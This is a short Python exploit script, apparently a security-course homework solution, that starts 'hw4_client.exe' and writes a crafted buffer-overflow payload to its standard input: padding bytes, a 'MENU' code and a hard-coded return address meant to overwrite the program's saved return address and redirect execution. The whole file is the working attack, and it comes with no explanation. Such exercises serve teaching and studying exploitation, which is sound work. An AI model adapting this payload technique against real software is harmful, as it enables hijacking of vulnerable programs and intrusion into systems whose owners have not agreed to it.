import socket
import sys
import subprocess
from subprocess import PIPE
from time import sleep

proc = subprocess.Popen(["hw4_client.exe"], stdin=PIPE)

desiredCode = "MENU"
desiredCOdeInHEX = "4D454E55"
proc.stdin.write(bytearray.fromhex("41"*4))
proc.stdin.flush()

desiredCode = "MENU"
prename =  "41" * 28 
postname = "41" * 35

first_attack = bytearray.fromhex(desiredCOdeInHEX) + bytearray.fromhex(prename) + bytearray.fromhex(desiredCOdeInHEX) + bytearray.fromhex("00") + bytearray.fromhex(postname) + bytearray.fromhex("AE1C4000") + str.encode("\n")


proc.stdin.write(first_attack)
proc.stdin.flush()

